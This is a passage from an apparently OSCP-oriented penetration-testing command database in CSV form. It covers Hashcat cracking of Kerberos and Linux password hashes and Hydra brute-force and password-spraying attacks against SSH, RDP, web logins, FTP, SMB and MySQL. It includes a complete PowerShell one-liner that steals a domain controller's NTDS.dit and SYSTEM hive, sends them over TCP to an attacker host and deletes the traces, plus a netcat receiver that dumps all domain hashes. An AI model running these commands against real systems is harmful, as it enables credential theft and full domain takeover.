If still fails, try rockyou-30000.rule (30K mutations, much slower but thorough).

Weak passwords (Password1!, Welcome2023!) crack in <5 min.

MONITORING:
Press 's' key for status.

--status --status-timer=30 for automatic updates every 30 seconds.

RESULT STORAGE:
Cracked passwords automatically saved to ~/.hashcat/hashcat.potfile.

View with:
hashcat -m 18200 hashes.asreproast --show.

ALTERNATIVE HASH FORMAT:
John the Ripper format also supported by some tools but Hashcat uses different mode.

Stick with Hashcat format from impacket/Rubeus.

OSCP EXAM:
AS-REP roasting is QUICK WIN if vulnerable users exist (rare but possible).

Total time:
30 sec enumeration + 1-30 min cracking = potential domain credentials in <30 minutes.","high","","","","{""Token length exception"": ""Hash format incorrect. Verify: (1) Used /nowrap flag with Rubeus (prevents line breaks). (2) Hash starts with $krb5asrep$23$. (3) Hash is single line (no line breaks mid-hash)."", ""No hashes loaded"": ""Hash file empty or wrong format. Verify file contains $krb5asrep$23$ hashes. Check for username: prefix (remove or use --username flag)."", ""Exhausted"": ""Password not in wordlist. Try: (1) Larger wordlist (rockyou.txt \u2192 xato-net-10-million). (2) Different rules (best64.rule \u2192 rockyou-30000.rule). (3) Targeted wordlist (user's name, company name, common patterns).""}","{""-m 18200"": ""Hash mode 18200 - Kerberos 5 AS-REP etype 23 (RC4-HMAC). Used for AS-REP Roasting attacks. Hash format: $krb5asrep$23$user@DOMAIN.COM:hash_data. Extracted from users with 'Do not require Kerberos preauthentication' enabled. FAST to crack (RC4-HMAC = no expensive KDF)."", ""-r"": ""Rule file - Apply password mutations (best64.rule recommended for OSCP - adds common patterns like Password1!, Password123, etc.)"", ""--force"": ""Force execution in VM without GPU (required in Kali VM)""}","[""impacket-getnpusers-asreproast"", ""rubeus-asreproast""]","","[""crackmapexec-validate-admin"", ""hashcat-show-cracked""]"
"hashcat-sha512crypt-crack","Crack SHA512crypt Hash (Mode 1800)","enumeration","hashcat -m 1800 <HASH_FILE> <WORDLIST> --force","Crack Linux SHA512crypt hashes ($6$ prefix from /etc/shadow)","","hashcat -m 1800 shadow_hashes.txt /usr/share/wordlists/rockyou.txt --force","SHA512crypt from Linux /etc/shadow ($6$ prefix). SLOW - uses 5000+ rounds by design. Extract with: unshadow /etc/passwd /etc/shadow > unshadowed.txt. GPU advantage limited due to algorithm design.","high","","","","","{""-m 1800"": ""Hash mode 1800 - sha512crypt ($6$ format). Linux password hashes from /etc/shadow. SLOW algorithm by design (5000+ rounds). Format: $6$salt$hash"", ""--force"": ""Force execution in Kali VM without GPU""}","","[""john-wordlist-attack""]","[""hashcat-show-cracked"", ""ssh-login-password""]"
"hashcat-crack-tgsrep","Crack Kerberos TGS-REP Hash (Mode 13100)","enumeration","hashcat -m 13100 <HASH_FILE> <WORDLIST> -r <RULE_FILE> --force","Crack Kerberos TGS-REP hashes (Kerberoasting attack)","","hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force","KERBEROASTING HASH CRACKING for service account SPNs.

HASH SOURCE:
impacket-GetUserSPNs (Linux) or Rubeus kerberoast (Windows).

TARGET ACCOUNTS:
User accounts with servicePrincipalName attribute (sql_service, iis_service, svc_backup, etc.).

UNCRACKABLE ACCOUNTS:
Computer accounts (ending in $) and Managed Service Accounts have 120-character RANDOM passwords - DO NOT ATTEMPT TO CRACK.

Filter these out before cracking.

HASH FORMAT:
$krb5tgs$23$ = RC4-HMAC (etype 23).

$krb5tgs$17$ or $krb5tgs$18$ = AES256 or AES128 (slower).

RC4 VS AES:
RC4 cracking ~10x faster than AES.

Use Rubeus /tgtdeleg flag to force RC4 downgrade on AES-enabled accounts.

CRACKING SPEED:
RC4 hash rate similar to NTLM (very fast).

GPU:
~500 MH/s.

CPU:
~500 KH/s.

SERVICE ACCOUNT PASSWORD PATTERNS:
Often follow conventions:
(1) ServiceName + number (SQL  MSSQLService123!).

(2) Company + service (Acme  AcmeSQL2019!).

(3) Generic weak (Password1!, ServiceAccount123!).

(4) Unchanged for YEARS (service accounts rarely rotated).

ATTACK STRATEGY:
(1) STRAIGHT DICTIONARY:
hashcat -m 13100 hashes.kerberoast rockyou.txt --force (fast, try first).

(2) RULE-BASED:
Add best64.rule for common mutations (5-30 min).

(3) TARGETED:
Create custom wordlist from:
Company name (Acme), Service type (SQL, IIS, Backup), Common patterns (Service123!, ServiceAccount2019!).

(4) COMPREHENSIVE:
Use rockyou-30000.rule for thorough attack (hours but higher success rate).

TIME ESTIMATE:
Weak password (dict word + number) = 5-30 min with rules.

Medium password (10 random chars) = hours to days.

Strong password (12+ random) = infeasible.

OSCP SUCCESS RATE:
HIGH - 60-80% of corporate domains have Kerberoastable accounts with weak passwords.

Service accounts often neglected (set once, never changed, weak password chosen for 'memorability').

MONITORING:
--status --status-timer=30 for progress updates.

RESULT EXTRACTION:
hashcat -m 13100 hashes.kerberoast --show displays cracked passwords.

--outfile-format=2 for passwords only, =5 for hash:password pairs.

OSCP EXAM:
Kerberoasting is HIGH-PRIORITY attack.

Total time:
10 sec SPN enum + 10 sec TGS request + 5-120 min cracking.

Often leads to:
(1) Service account with Domain Admin privileges (immediate win).

(2) Local admin on servers (lateral movement).

(3) High-privilege service account (privilege escalation opportunities).

CRITICAL WARNING:
If all SPNs are on computer accounts (names ending in $), hashes are UNCRACKABLE.

Document finding and proceed to alternative attacks (AS-REP roasting, password spraying, local privilege escalation).","high","","","","{""Token length exception"": ""Hash format incorrect. Verify: (1) Hash starts with $krb5tgs$23$ (RC4) not $krb5tgs$17$ or $krb5tgs$18$ (AES). (2) Single line format. (3) Extracted from USER account (not computer account)."", ""No hashes loaded"": ""Hash file empty, wrong format, or contains computer account hashes only. Filter: grep -v '\\$@' hashes.kerberoast (removes computer accounts ending in $)."", ""Exhausted after hours"": ""Possible causes: (1) Strong password (service accounts sometimes have complex passwords). (2) AES encryption (modes 19600/19700 = 10x slower). (3) Computer/MSA account (120-char password = uncrackable). Verify hash is from USER account, not computer account.""}","{""-m 13100"": ""Hash mode 13100 - Kerberos 5 TGS-REP etype 23 (RC4-HMAC). Used for Kerberoasting attacks against service accounts. Hash format: $krb5tgs$23$*service_account$REALM$spn*$hash_data. CRITICAL: Computer accounts (MACHINE$) and Managed Service Accounts have 120-character random passwords = UNCRACKABLE. Only crack hashes from USER service accounts."", ""-r"": ""Rule file - Mutations for service account password patterns (ServiceName123!, CompanySQL2023!, etc.)"", ""--force"": ""Force execution in VM without GPU""}","[""impacket-getuserspns-kerberoast"", ""rubeus-kerberoast""]","","[""crackmapexec-validate-admin"", ""hashcat-show-cracked""]"
"hydra-ssh-single-user","SSH Dictionary Attack - Single User","enumeration","hydra -l <USERNAME> -P <WORDLIST> -s <PORT> ssh://<TARGET>","Dictionary attack against SSH service for single user","","hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.45.100","OSCP TIP:
Dictionary attacks generate significant noise (logs, IDS alerts).

Always verify target doesn't have account lockout policies before running.

Test with small wordlist first (100 passwords).

Time estimate:
14M passwords @ 16 tasks/second = ~14 hours for rockyou.txt on typical lab connection.

Use filtered wordlists or rule-based mutations for efficiency.

Default accounts (root, admin, administrator) are high-value targets.","high","","","","{""Too many authentication failures"": ""SSH configured with MaxAuthTries limit. Solution: Use -t 4 to limit parallel tasks, or wait between attempts with -w"", ""Connection refused"": ""Service not running or firewall blocking. Verify with: nmap -p <PORT> <TARGET>"", ""No password found after hours"": ""1) Verify username is correct 2) Check password policy requirements 3) Try wordlist with rules (mutated passwords) 4) Consider time constraints - may not be viable attack vector""}","{""-l"": ""Login name - Specifies single username to test. Use when you've identified a specific user through enumeration (LDAP, email addresses, default accounts like 'root' or 'admin'). More focused than username list attacks."", ""-P"": ""Password list - Path to wordlist file containing password candidates. rockyou.txt (14M passwords) is standard starting point. More effective with rules applied first. Consider target's password policy when selecting wordlist."", ""-s"": ""Port - Override default service port. REQUIRED when service runs on non-standard port (common in CTF/lab environments to avoid automated attacks). SSH defaults to 22 but often moved to 2222, 22222, etc."", ""ssh://"": ""Protocol specification - Tells Hydra to use SSH authentication module. Format: protocol://target or target protocol""}","[""nmap-service-scan""]","[""hydra-ssh-user-list""]","[""ssh-login-password"", ""ssh-connect-password""]"
"hydra-ssh-user-list","SSH Dictionary Attack - User List","enumeration","hydra -L <USERLIST> -P <WORDLIST> -s <PORT> ssh://<TARGET>","Dictionary attack against SSH with multiple usernames","","hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt -s 22 ssh://192.168.45.100","WARNING:
This attack can trigger account lockouts if multiple users have lockout policies.

Keyspace = userlist_size  wordlist_size.

With 100 users and 14M passwords = 1.4B attempts.

Consider using focused wordlists or password spraying instead.","medium","","","","","{""-L"": ""User list - Path to file with multiple usernames. Use capital 'L' for file, lowercase 'l' for single user. Effective when you've enumerated users through SMTP VRFY, LDAP, or web application user disclosure. Increases keyspace multiplicatively (users \u00d7 passwords).""}","[""nmap-service-scan"", ""kerbrute-userenum-ad""]","[""hydra-ssh-single-user""]","[""ssh-login-password"", ""ssh-connect-password""]"
"hydra-rdp-spray","RDP Password Spraying","enumeration","hydra -L <USERLIST> -p ""<PASSWORD>"" rdp://<TARGET>","Password spraying attack against RDP service","","hydra -L /usr/share/wordlists/dirb/others/names.txt -p ""SuperS3cure1337#"" rdp://192.168.45.100","OSCP TIP:
Password spraying is stealthier than dictionary attacks (fewer attempts per user, less likely to trigger lockouts).

Common spray passwords:
Company name + year + !, Season + year + !, Password123!, Welcome123!.

RDP default port 3389 is often exposed on Windows servers.

Time estimate:
~15 minutes for 8,000 users with 1 password.","high","","","","{""ERROR freerdp shown for valid creds"": ""Known Hydra limitation with RDP module. Solution: Verify manually with xfreerdp or rdesktop"", ""Slow performance"": ""RDP authentication is slow by design. Solution: Limit threads with -t 4, be patient""}","{""-p"": ""Password - Single password (lowercase 'p'). Used for password spraying. Lowercase 'p' = single password, capital 'P' = password list. Spray attacks test one password against many users, avoiding account lockout thresholds (typically 3-5 failed attempts per account)."", ""rdp://"": ""RDP protocol - Uses FreeRDP for authentication testing. May show '[ERROR] freerdp: The connection failed to establish' even on successful authentication (Hydra limitation). Verify credentials manually with: xfreerdp /v:<TARGET> /u:<USER> /p:<PASS>""}","[""nmap-service-scan"", ""kerbrute-userenum-ad""]","[""crackmapexec-smb-spray"", ""hydra-smb-attack""]","[""xfreerdp-connect""]"
"hydra-http-post-form","HTTP POST Login Form Attack","enumeration","hydra -l <USERNAME> -P <WORDLIST> <TARGET> http-post-form ""<LOGIN_PAGE>:<POST_DATA>:<FAIL_STRING>""","Dictionary attack against HTTP POST login forms","","hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.45.100 http-post-form ""/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid""","OSCP TIP:
1) Use Burp to intercept login attempt - get POST data 2) Try failed login in browser - get failure message 3) Shorten failure string (avoid words like 'password' or 'username') 4) Default web users:
admin, administrator, user, root, test.

Time estimate:
14M passwords @ ~10-20 attempts/second = 16-32 hours (slow due to HTTP overhead).

Use filtered wordlists.

Web Application Firewalls (WAFs) will block this quickly - may not be viable if WAF present.","high","","","","{""False positives"": ""Failure string too generic. Solution: Use longer, more specific string from failed login message"", ""No matches found"": ""Failure string not in response. Solution: Check response in Burp, verify exact error message"", ""Slow performance"": ""Web app may have rate limiting. Solution: Reduce threads with -t 4""}","{""http-post-form"": ""HTTP POST method - Format: \""<page>:<params>:<fail>\"". Three colon-separated fields REQUIRED. Hydra submits POST data with ^PASS^ replaced by wordlist passwords. ^USER^ also supported for username placeholder."", ""<POST_DATA>"": ""Request body - Captured from Burp Suite intercept. Include all form fields (username, password, tokens). Use ^PASS^ where password goes, ^USER^ where username goes (if testing both)."", ""<FAIL_STRING>"": ""Failure indicator - Shortened string from failed login response. Hydra searches response for this string. If NOT found = successful login. Keep it short but unique (avoid generic words like 'password' or 'username' to reduce false positives).""}","[""nmap-service-scan""]","[""wfuzz-post-login-brute"", ""ffuf-param-fuzz""]",""
"hydra-ftp-attack","FTP Dictionary Attack","enumeration","hydra -l <USERNAME> -P <WORDLIST> ftp://<TARGET>","Dictionary attack against FTP service","","hydra -l ftp -P /usr/share/wordlists/rockyou.txt ftp://192.168.45.100","Check anonymous FTP first:
ftp <TARGET>, username 'anonymous', password blank or email.

FTP cleartext = fast authentication = faster than HTTP/RDP.

Default users:
ftp, anonymous, admin, root.","medium","","","","","{""ftp://"": ""FTP protocol - Default port 21. Hydra tests cleartext authentication. Check for anonymous login first (ftp/anonymous user) before running dictionary attack.""}","[""nmap-service-scan""]","",""
"hydra-smb-attack","SMB Dictionary Attack","enumeration","hydra -l <USERNAME> -P <WORDLIST> smb://<TARGET>","Dictionary attack against SMB/CIFS service","","hydra -l Administrator -P /usr/share/wordlists/rockyou.txt smb://192.168.45.100","OSCP TIP:
Windows default accounts - Administrator, Guest (usually disabled), service accounts.

SMB lockout policies are STRICT - be very careful.

Test with 5-10 passwords first.

Prefer password spraying over dictionary attack on SMB.","high","","","","{""NT_STATUS_ACCOUNT_LOCKED_OUT"": ""Account lockout policy triggered. STOP IMMEDIATELY. Wait 30-60 minutes or test different account. Lockout typically 3-5 failed attempts."", ""Connection refused on 445"": ""SMB port filtered. Try port 139: hydra -l <USER> -P <WORDLIST> -s 139 smb://<TARGET>""}","{""smb://"": ""SMB protocol - Tests authentication on port 445 (SMB) or 139 (NetBIOS). Windows account authentication. Successful auth doesn't guarantee share access (depends on ACLs).""}","[""nmap-service-scan""]","[""crackmapexec-smb-spray"", ""hydra-rdp-spray""]","[""smbclient-list-shares"", ""psexec-shell"", ""evil-winrm-shell""]"
"hydra-mysql-attack","MySQL Dictionary Attack","enumeration","hydra -l <USERNAME> -P <WORDLIST> mysql://<TARGET>","Dictionary attack against MySQL database","","hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.45.100","Default MySQL users:
root (no password on some installs), admin, user.

Port 3306 rarely exposed externally but common internally.

Successful auth = database access = potential data exfiltration or privilege escalation.","medium","","","","","{""mysql://"": ""MySQL protocol - Default port 3306. Tests database authentication. Common users: root, admin, user, mysql. Success gives database access for data exfiltration or privilege escalation via UDF.""}","","",""
"hydra-verbose","Hydra Verbose Output","enumeration","hydra -l <USERNAME> -P <WORDLIST> -V <PROTOCOL>://<TARGET>","Run Hydra with verbose output showing every attempt","","hydra -l admin -P /usr/share/wordlists/rockyou.txt -V ssh://192.168.45.100","Use for troubleshooting only.

Output is overwhelming with large wordlists.

Alternative:
-v (lowercase) shows found passwords without showing every attempt.","low","","","","","{""-V"": ""Verbose mode - Shows every login attempt with username:password combination. Useful for debugging (verify wordlist loaded, confirm attempts being made). WARNING: Extremely noisy output - can fill screen/logs quickly. Use only for troubleshooting or small wordlists.""}","","",""
"hydra-custom-port","Hydra Custom Port","enumeration","hydra -l <USERNAME> -P <WORDLIST> -s <PORT> <PROTOCOL>://<TARGET>","Attack service on non-standard port","","hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.45.100","Always check nmap results for non-standard ports.

Examples:
SSH on 2222, HTTP on 8080, RDP on 3390, MySQL on 13306.","medium","","","","","{""-s"": ""Custom port - Override default service port. REQUIRED when service runs on non-standard port. Common in CTF/labs to avoid automated scanners. SSH often on 2222/22222, HTTP on 8080/8000/8888, RDP on 3390.""}","[""nmap-service-scan"", ""nmap-quick-scan""]","[""hydra-ssh-single-user""]","[""ssh-login-password""]"
"hydra-parallel-tasks","Hydra Parallel Tasks Configuration","enumeration","hydra -l <USERNAME> -P <WORDLIST> -t <TASKS> <PROTOCOL>://<TARGET>","Configure number of parallel connections","","hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 ssh://192.168.45.100","OSCP TIP:
Default -t 16 is aggressive - may trigger lockouts or 'too many authentication failures' on SSH.

Conservative approach:
-t 4 for SSH, -t 8 for HTTP, -t 16 for FTP (fast protocol).

Always test with small wordlist first.","medium","","","","{""Too many authentication failures"": ""SSH MaxAuthTries limit. Solution: Reduce with -t 4"", ""Connection timeouts"": ""Target overwhelmed. Solution: Reduce to -t 2-4"", ""Account lockouts"": ""Too many failed attempts. Solution: Use -t 1 with -w 30 (30 second wait between attempts)""}","{""-t"": ""Parallel tasks - Number of concurrent connections. Default 16 (aggressive). Lower values (4-8) reduce load on target and risk of triggering IDS/lockout. Higher values (32-64) faster but riskier. Balance speed vs stealth based on target sensitivity.""}","","",""
"hydra-wait-time","Hydra Wait Time Between Attempts","enumeration","hydra -l <USERNAME> -P <WORDLIST> -t <TASKS> -w <SECONDS> <PROTOCOL>://<TARGET>","Add delay between connection attempts to avoid detection/lockout","","hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 2 -w 5 ssh://192.168.45.100","Stealth option - significantly slows attack.

Example:
1000 passwords  5 seconds = 83 minutes.

Only use when absolutely necessary (strict lockout, IDS alerts, exam restriction).

Not typically needed in OSCP labs.","low","","","","","{""-w"": ""Wait time - Seconds to wait between connection attempts. Slows attack but reduces detection risk and avoids overwhelming target. Use when: 1) IDS/IPS present 2) Account lockout policy strict 3) Target resource-constrained. Dramatically increases total attack time.""}","","",""
"hydra-resume-session","Hydra Resume Session","enumeration","hydra -l <USERNAME> -P <WORDLIST> -R <PROTOCOL>://<TARGET>","Resume previously aborted/crashed Hydra session","","hydra -l admin -P /usr/share/wordlists/rockyou.txt -R ssh://192.168.45.100","Hydra creates hydra.restore file automatically.

Resume with -R flag.

All original parameters must match.

Useful for multi-hour attacks that get interrupted.","low","","","","","{""-R"": ""Resume - Restores session from hydra.restore file (automatically created). Continues from last attempted password. Useful for long-running attacks interrupted by network issues, crashes, or Ctrl+C. All parameters (user, wordlist, target, protocol) must match original session exactly.""}","","",""
"hydra-show-attempts","Hydra Show Attempt Progress","enumeration","hydra -l <USERNAME> -P <WORDLIST> -v <PROTOCOL>://<TARGET>","Show found credentials without verbose attempt output","","hydra -l admin -P /usr/share/wordlists/rockyou.txt -v ssh://192.168.45.100","Lowercase -v is recommended (shows progress without spam).

Uppercase -V shows every attempt (too noisy).

Default (no flag) only shows final results.","medium","","","","","{""-v"": ""Verbose (lowercase) - Shows successful credentials and status updates without showing every attempt (unlike -V uppercase). Provides progress feedback without overwhelming output. Best for production use.""}","","",""
"hydra-output-file","Hydra Save Output to File","enumeration","hydra -l <USERNAME> -P <WORDLIST> -o <OUTPUT_FILE> <PROTOCOL>://<TARGET>","Save found credentials to file for documentation","","hydra -l admin -P /usr/share/wordlists/rockyou.txt -o hydra_results.txt ssh://192.168.45.100","OSCP REQUIREMENT:
Document all found credentials with source/method.

-o flag creates audit trail.

Always use for exam/professional work.","medium","","","","","{""-o"": ""Output file - Save found credentials to file. Format: 'host: <IP> login: <USER> password: <PASS>'. Critical for OSCP documentation requirements. File created automatically. Credentials still shown on screen.""}","","",""
"hydra-combo-attack","Hydra Credential Pair Attack","enumeration","hydra -C <CREDENTIAL_FILE> <PROTOCOL>://<TARGET>","Test credential pairs from file (username:password format)","","hydra -C creds.txt ssh://192.168.45.100","Use for default credential testing or credential stuffing.

Common default pairs:
admin:admin, root:root, administrator:password, user:user.

SecLists has good default credential lists.","medium","","","","","{""-C"": ""Credential pairs - File format: 'username:password' (colon-separated, one pair per line). Used for credential stuffing attacks (testing leaked credentials from breaches, default creds lists). More efficient than separate user/password lists when you have known pairs. Example file: admin:admin, root:toor, user:password123""}","[""nmap-service-scan""]","[""hydra-ssh-single-user""]","[""ssh-login-password"", ""evil-winrm-shell""]"
"post-vss-ntds-exfil-combo","VSS NTDS.dit + SYSTEM Extract & Exfil (PowerShell One-liner)","post-exploit","$DRIVE=""C:""; $LHOST=""<LHOST>""; $LPORT=<LPORT>; $VSHADOW=""<VSHADOW_PATH>""; $out=& $VSHADOW -nw -p $DRIVE 2>&1 | Out-String; $sc=[regex]::Match($out,'HarddiskVolumeShadowCopy\d+').Value; cmd /c ""mklink /d C:\sc \\?\GLOBALROOT\Device\$sc\""; copy C:\sc\Windows\NTDS\ntds.dit C:\ntds.dit; reg save hklm\system C:\system.bak; cmd /c ""rmdir C:\sc""; Compress-Archive -Path C:\ntds.dit,C:\system.bak -DestinationPath C:\loot.zip -Force; $f=[IO.File]::ReadAllBytes(""C:\loot.zip""); $c=New-Object Net.Sockets.TcpClient($LHOST,$LPORT); $c.GetStream().Write($f,0,$f.Length); $c.Close(); Remove-Item C:\ntds.dit,C:\system.bak,C:\loot.zip -Force","Complete PowerShell one-liner: Creates VSS shadow copy with vshadow.exe, extracts NTDS.dit and SYSTEM hive, compresses to zip, exfiltrates via raw TCP socket, and cleans up all artifacts. Alternative to DCSync when replication rights unavailable but local admin on DC exists.","credential-extraction","$DRIVE=""C:""; $LHOST=""192.168.45.xxx""; $LPORT=9001; $VSHADOW=""C:\Tools\vshadow.exe""; $out=& $VSHADOW -nw -p $DRIVE 2>&1 | Out-String; $sc=[regex]::Match($out,'HarddiskVolumeShadowCopy\d+').Value; cmd /c ""mklink /d C:\sc \\?\GLOBALROOT\Device\$sc\""; copy C:\sc\Windows\NTDS\ntds.dit C:\ntds.dit; reg save hklm\system C:\system.bak; cmd /c ""rmdir C:\sc""; Compress-Archive -Path C:\ntds.dit,C:\system.bak -DestinationPath C:\loot.zip -Force; $f=[IO.File]::ReadAllBytes(""C:\loot.zip""); $c=New-Object Net.Sockets.TcpClient($LHOST,$LPORT); $c.GetStream().Write($f,0,$f.Length); $c.Close(); Remove-Item C:\ntds.dit,C:\system.bak,C:\loot.zip -Force","OSCP ONE-LINER COMBO: Complete credential extraction in single command execution. USE CASE: When DCSync unavailable (no replication rights) but have local Administrator on DC.

PREREQUISITES:
1. Local Administrator on Domain Controller
2. vshadow.exe uploaded to DC (from Windows SDK)
3. PowerShell 5.0+ (Compress-Archive requirement)
4. Network connectivity from DC to Kali on specified port
5. Netcat listener started FIRST on attacker machine

WORKFLOW:
1. Start listener on Kali: nc -lvnp 9001 -q 0 > loot.zip
2. Execute one-liner on DC (paste entire command)
3. Wait for transfer (~30sec-2min depending on NTDS.dit size)
4. On Kali: unzip loot.zip && impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL

OPSEC CONSIDERATIONS:
- Creates persistent shadow copy (auto-deleted NOT implemented - delete manually if needed)
- mklink/rmdir operations logged (Event ID 4663 if object access auditing enabled)
- TCP egress from DC to arbitrary port may trigger alerts
- Files temporarily written to C:\ root (visible to other admins)

TIME ESTIMATE: 1-5 minutes depending on domain size (NTDS.dit typically 20-500MB)

ALTERNATIVE WITHOUT VSHADOW: Replace vshadow.exe with vssadmin:
$out = vssadmin create shadow /for=C: | Out-String; $sc=[regex]::Match($out,'HarddiskVolumeShadowCopy\d+').Value; ...

MANUAL ALTERNATIVE: Run each step separately (see ad-shadow-copies.json commands)

VS DCSYNC: DCSync is stealthier (no file creation, uses replication protocol). Use this method when DCSync unavailable due to insufficient privileges but local admin access exists on DC.","high","","","","{""vshadow.exe not found"": ""Verify path: Test-Path $VSHADOW. Upload vshadow.exe from Windows SDK or use vssadmin alternative: vssadmin create shadow /for=C:"", ""Access denied"": ""Requires local Administrator on DC. Verify: net localgroup Administrators %USERNAME%. Run from elevated PowerShell."", ""NTDS.dit not found"": ""Non-standard install location. Find it: dir C:\\ /s /b | findstr ntds.dit OR check registry: (Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters').'Database log files path'"", ""TCP connection refused"": ""Ensure listener started FIRST on Kali: nc -lvnp <LPORT> -q 0 > loot.zip. Check firewall allows outbound from DC."", ""Compress-Archive not found"": ""PowerShell <5.0. Alternative: Manually copy ntds.dit and system.bak separately using two TCP transfers, or use certutil for base64 encoding."", ""Incomplete zip received"": ""Network timeout. Increase -q value on listener: nc -lvnp <LPORT> -q 5 > loot.zip. Or verify DC can reach Kali: Test-NetConnection -ComputerName <LHOST> -Port <LPORT>"", ""secretsdump fails after transfer"": ""Files corrupted during transfer. Verify: unzip -t loot.zip. Re-run one-liner. For large NTDS.dit (>100MB), consider SMB transfer instead.""}","{""$DRIVE"": ""Target drive letter for VSS snapshot (C: contains NTDS.dit on DCs). Colon required."", ""-nw"": ""No-writers option for vshadow.exe - disables VSS writers for faster snapshot creation. Safe for NTDS.dit - AD handles consistency internally."", ""-p"": ""Persistent shadow copy - stores on disk (survives reboot). Required for file extraction operations."", ""[regex]::Match()"": ""PowerShell regex to extract shadow copy device name (HarddiskVolumeShadowCopyN) from vshadow.exe output for path construction."", ""mklink /d"": ""Creates directory symbolic link C:\\sc pointing to shadow copy device. Allows standard file operations on locked NTDS.dit via shadow path."", ""reg save hklm\\system"": ""Exports SYSTEM registry hive containing boot key (syskey) required to decrypt NTDS.dit password hashes."", ""Compress-Archive -Force"": ""PowerShell native compression. -Force overwrites existing zip. Combines ntds.dit + system.bak into single file for efficient exfil."", ""[IO.File]::ReadAllBytes()"": "".NET method to read entire zip file as byte array for raw TCP transmission. Preserves binary integrity."", ""Net.Sockets.TcpClient"": ""PowerShell .NET TCP socket client - sends raw binary data to listener without protocol overhead."", ""Remove-Item -Force"": ""Cleanup: Deletes extracted files and zip to minimize forensic artifacts on target.""}","[""ad-vshadow-create-shadow"", ""post-nc-receive-zip-secretsdump""]","[""ad-dcsync-impacket-secretsdump-user"", ""ad-vssadmin-create-shadow""]","[""ad-secretsdump-parse-ntds""]"
"post-nc-receive-zip-secretsdump","Receive NTDS Zip + Parse with secretsdump","post-exploit","nc -lvnp <LPORT> -q 0 > loot.zip && unzip loot.zip && impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL","Attacker-side combo: Netcat listener receives compressed NTDS.dit + SYSTEM zip, extracts files, and parses offline with impacket-secretsdump to extract all domain credentials.","credential-extraction","nc -lvnp 9001 -q 0 > loot.zip && unzip loot.zip && impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL","ATTACKER-SIDE RECEIVER: Start this BEFORE executing target-side one-liner.

WORKFLOW:
1. Run this command on Kali (starts listener)
2. Execute post-vss-ntds-exfil-combo on target DC
3. Wait for transfer (30sec-2min)
4. Command auto-continues: unzip  secretsdump
5. All domain credentials printed to terminal

OUTPUT CAPTURE: Pipe to file for later reference:
nc -lvnp <LPORT> -q 0 > loot.zip && unzip loot.zip && impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL | tee domain_hashes.txt

OUTPUT FORMAT:
domain\username:RID:LMhash:NThash:::
Example: CORP\Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::

KEY HASHES TO LOOK FOR:
- Administrator:500 - Domain Admin NTLM for Pass-the-Hash
- krbtgt:502 - Golden Ticket creation (RID 502)
- Service accounts - Often have weak passwords, crack with hashcat

NEXT STEPS AFTER EXTRACTION:
- Pass-the-Hash: impacket-psexec -hashes :NThash administrator@target
- Crack hashes: hashcat -m 1000 hashes.txt rockyou.txt
- Golden Ticket: ticketer.py with krbtgt hash

CLEANUP: rm loot.zip ntds.dit system.bak (remove sensitive files after use)

TIME ESTIMATE: <1 minute for secretsdump parsing (most time is transfer wait)","high","","","","{""Address already in use"": ""Port occupied. Find process: sudo lsof -i :<PORT>. Kill or use different port."", ""Corrupt zip file"": ""Transfer incomplete. Check file size: ls -lh loot.zip (should be >20MB typically). Re-run: Delete loot.zip, restart listener, re-execute target command."", ""unzip: cannot find"": ""Kali missing unzip. Install: sudo apt install unzip. Or use: python3 -m zipfile -e loot.zip ."", ""secretsdump errors"": ""Wrong file names. Check: unzip -l loot.zip (list contents). If named differently, adjust: impacket-secretsdump -ntds <actual_name> -system <actual_name> LOCAL"", ""No connection received"": ""Firewall blocking, wrong IP on target side, or target command failed. Verify: Target can reach Kali port with Test-NetConnection. Check target error output."", ""nc hangs after transfer"": ""Missing -q flag. nc without -q waits indefinitely. Kill with Ctrl+C, file likely complete. Restart with -q 0 for cleaner operation.""}","{""-l"": ""Listen mode - nc becomes server waiting for incoming connection from target DC."", ""-v"": ""Verbose - displays connection details when target connects."", ""-n"": ""No DNS resolution - use IP addresses only for faster connection handling."", ""-p"": ""Port specification (some nc versions don't require -p flag)."", ""-q 0"": ""Quit immediately after EOF received (connection closed by sender). Critical for chaining with && operators. Without -q, nc may hang waiting for more data."", ""> loot.zip"": ""Redirect received bytes to loot.zip file. Binary-safe - preserves zip integrity."", ""&&"": ""Shell operator - execute next command only if previous succeeded. Ensures unzip only runs after complete transfer."", ""unzip loot.zip"": ""Extract ntds.dit and system.bak from received archive."", ""-ntds"": ""Path to NTDS.dit database file for secretsdump offline parsing."", ""-system"": ""Path to SYSTEM registry hive containing boot key for NTDS.dit decryption."", ""LOCAL"": ""Keyword for secretsdump offline mode - parse local files without network connection to target.""}","","[""ft-nc-receive""]",""
"python-http-server","Python HTTP Server","post-exploit","python3 -m http.server <PORT>","Start simple HTTP server for file transfers","general-transfer","python3 -m http.server 8000","Serves files from current directory","high","","","","","{""-m"": ""Run module as main program"", ""http.server"": ""Built-in HTTP server module"", ""8000"": ""Default port if not specified""}","","[""python-m-simplehttpserver""]",""
"wget-download","Wget Download","post-exploit","wget http://<LHOST>:<PORT>/<FILE> -O <OUTPUT>","Download file using wget","general-transfer","wget http://10.10.14.5:8000/linpeas.sh -O linpeas.sh","Available on most Linux systems","high","","","","","{""-O"": ""Output filename (capital O)"", ""-q"": ""Quiet mode"", ""--no-check-certificate"": ""Skip SSL verification"", ""-r"": ""Recursive download""}","[""python-http-server""]","[""curl-upload"", ""certutil-download"", ""powershell-download""]","[""linux-privesc-linpeas"", ""linux-suid-find""]"
